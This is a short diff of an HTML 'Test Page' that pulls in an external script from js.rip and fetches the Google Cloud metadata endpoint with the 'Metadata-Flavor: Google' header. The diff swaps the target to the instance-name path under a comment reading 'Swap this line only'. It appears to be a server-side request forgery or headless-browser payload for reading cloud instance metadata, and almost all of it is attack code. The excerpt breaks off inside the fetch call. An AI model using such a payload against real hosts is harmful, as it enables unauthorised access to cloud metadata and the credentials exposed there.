@@ -4,7 +4,7 @@
   <title>Test Page</title>
   <script src="https://js.rip/5mw8at9w5s"></script>
   <script>
-    const targetUrl = "http://metadata.google.internal/"; // 🔁 Swap this line only
+    const targetUrl = "http://metadata.google.internal/computeMetadata/v1/instance/name"; // 🔁 Swap this line only
 
     fetch(targetUrl, {
       headers: { "Metadata-Flavor": "Google" }
